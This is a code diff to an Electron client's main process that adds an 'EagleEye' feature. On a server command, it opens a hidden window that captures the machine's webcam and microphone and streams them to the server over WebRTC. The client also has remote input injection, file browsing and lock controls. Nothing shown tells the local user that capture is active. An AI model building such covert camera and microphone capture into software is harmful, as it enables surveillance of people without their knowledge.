@@ -17,6 +17,7 @@ dotenv.config();
 let mainWindow: BrowserWindow | null = null;
 let serverConnection: ServerConnection | null = null;
 let webrtcWindow: BrowserWindow | null = null;
+let eagleEyeWindow: BrowserWindow | null = null;
 let inputInjection: InputInjection | null = null;
 let isLocked = false;
 let isInternetBlocked = false;
@@ -629,6 +630,28 @@ function connectToServer() {
     }
   });
 
+  // Registra callback per EagleEye
+  serverConnection.onStartEagleEye(() => {
+    console.log('[Main] Ricevuto comando START EAGLE EYE dal server');
+    startEagleEye();
+  });
+
+  serverConnection.onStopEagleEye(() => {
+    console.log('[Main] Ricevuto comando STOP EAGLE EYE dal server');
+    stopEagleEye();
+  });
+
+  serverConnection.onEagleEyeSignal((signal) => {
+    console.log('[Main] Ricevuto segnale EagleEye:', signal.type);
+    if (eagleEyeWindow && !eagleEyeWindow.isDestroyed()) {
+      if (signal.type === 'answer' && signal.answer) {
+        eagleEyeWindow.webContents.send('eagleeye:answer', signal.answer);
+      } else if (signal.type === 'candidate' && signal.candidate) {
+        eagleEyeWindow.webContents.send('eagleeye:candidate', signal.candidate);
+      }
+    }
+  });
+
   // File system operation handlers
   serverConnection.on('server:fs-list', async (data: { dirPath: string; requestId: string }) => {
     console.log('[Main] File Explorer: List directory', data.dirPath);
@@ -1065,6 +1088,130 @@ function setupWebRTCHandlers() {
   webrtcHandlersSetup = true;
   console.log('[Main] WebRTC IPC handlers setup complete');
 }
+
+// ========== EAGLE EYE (Webcam/Mic) ==========
+
+async function startEagleEye() {
+  console.log('[Main] Starting EagleEye (Webcam/Mic capture)...');
+
+  try {
+    // Create hidden WebRTC window if not exists
+    if (!eagleEyeWindow || eagleEyeWindow.isDestroyed()) {
+      console.log('[Main] Creating EagleEye window...');
+
+      eagleEyeWindow = new BrowserWindow({
+        show: false,
+        webPreferences: {
+          nodeIntegration: true,
+          contextIsolation: false,
+          backgroundThrottling: false // Important for real-time media
+        }
+      });
+
+      eagleEyeWindow.loadFile(path.join(__dirname, '../renderer/eagleeye-capture.html'));
+
+      // Setup IPC handlers (only once)
+      setupEagleEyeHandlers();
+
+      // Wait for window to be ready
+      await new Promise<void>((resolve) => {
+        eagleEyeWindow!.webContents.once('did-finish-load', () => {
+          console.log('[Main] EagleEye window loaded');
+          resolve();
+        });
+      });
+    }
+
+    // Send start command
+    console.log('[Main] Sending start command to EagleEye renderer');
+    eagleEyeWindow.webContents.send('eagleeye:start');
+
+  } catch (error) {
+    console.error('[Main] Error starting EagleEye:', error);
+
+    if (serverConnection) {
+      serverConnection.sendEagleEyeSignal({
+        type: 'error',
+        message: error instanceof Error ? error.message : 'Unknown error'
+      });
+    }
+  }
+}
+
+function stopEagleEye() {
+  console.log('[Main] Stopping EagleEye...');
+
+  if (eagleEyeWindow) {
+    eagleEyeWindow.webContents.send('eagleeye:stop');
+    eagleEyeWindow.close();
+    eagleEyeWindow = null;
+  }
+
+  console.log('[Main] EagleEye stopped');
+}
+
+let eagleEyeHandlersSetup = false;
+
+function setupEagleEyeHandlers() {
+  // Prevent duplicate handler registration
+  if (eagleEyeHandlersSetup) {
+    return;
+  }
+
+  console.log('[Main] Setting up EagleEye IPC handlers');
+
+  // Offer created by renderer
+  ipcMain.on('eagleeye:offer', (event, offer) => {
+    console.log('[Main] Received EagleEye offer from renderer');
+    if (serverConnection) {
+      serverConnection.sendEagleEyeSignal({
+        type: 'offer',
+        offer
+      });
+    }
+  });
+
+  // ICE candidate from renderer
+  ipcMain.on('eagleeye:icecandidate', (event, candidate) => {
+    if (serverConnection) {
+      serverConnection.sendEagleEyeSignal({
+        type: 'candidate',
+        candidate
+      });
+    }
+  });
+
+  // Connection state changes
+  ipcMain.on('eagleeye:connectionstate', (event, state) => {
+    console.log('[Main] EagleEye connection state:', state);
+  });
+
+  // Errors
+  ipcMain.on('eagleeye:error', (event, errorMessage) => {
+    console.error('[Main] EagleEye renderer error:', errorMessage);
+    if (serverConnection) {
+      serverConnection.sendEagleEyeSignal({ type: 'error', message: errorMessage });
+    }
+  });
+
+  ipcMain.on('eagleeye:error-camera', (event, errorMessage) => {
+    console.error('[Main] EagleEye Camera/Mic not found:', errorMessage);
+    if (serverConnection) {
+      serverConnection.sendEagleEyeSignal({ type: 'error-camera', message: errorMessage });
+    }
+  });
+
+  ipcMain.on('eagleeye:error-permission', (event, errorMessage) => {
+    console.error('[Main] EagleEye Permission denied:', errorMessage);
+    if (serverConnection) {
+      serverConnection.sendEagleEyeSignal({ type: 'error-permission', message: errorMessage });
+    }
+  });
+
+  eagleEyeHandlersSetup = true;
+  console.log('[Main] EagleEye IPC handlers setup complete');
+}
+
 
 function quitApp() {
   // Disconnetti dal server
